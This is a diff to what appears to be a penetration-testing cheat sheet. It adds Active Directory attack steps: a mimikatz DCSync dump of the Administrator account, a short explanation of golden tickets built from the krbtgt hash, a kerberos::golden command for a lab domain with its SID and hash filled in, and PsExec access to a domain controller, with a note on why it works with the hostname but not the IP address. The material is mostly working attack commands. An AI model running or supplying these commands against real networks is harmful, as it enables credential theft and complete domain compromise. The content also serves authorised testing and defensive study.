@@ -1125,9 +1125,11 @@ mimikatz # sekurlsa::logonpasswords
 mimikatz # lsadump::sam 
 mimikatz # lsadump::sam /patch
 mimikatz # lsadump::lsa /patch
+mimikatz # lsadump::dcsync /user:Administrator
 ```
 
 ### Golden Ticket Attack
+When a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is actually the password hash of a domain user account called krbtgt. By getting the krbtgt password hash one is able to create custom TGTs (golden tickets)
 
 ```
 mimikatz # privilege::debug
@@ -1138,7 +1140,13 @@ Copy S-ID of the domain and NTLM hash of TGT-Account.
 
 ```
 mimikatz # kerberos::golden /User:Administrator /domain:whiterose.local /sid:S-1-5-21-301242389-3840584950-2384549833 /krbtgt:64f12cdda88057e06a81b54e73b949b /id:500 /ptt
-mimikatz # misc::cmd
+mimikatz # misc::cmd # to launch new command prompt
+
+> psexec.exe \\dc01 cmd.exe
+```
+:information_source: Note that by creating our own TGT and then using PsExec, we are performing the overpass the hash attack by leveraging Kerberos authentication. If we were to connect using PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked. Therefore the following would not work!
+```
+> psexec.exe \\10.10.10.100 cmd.exe
 ```
 
 # Web Application Enumeration
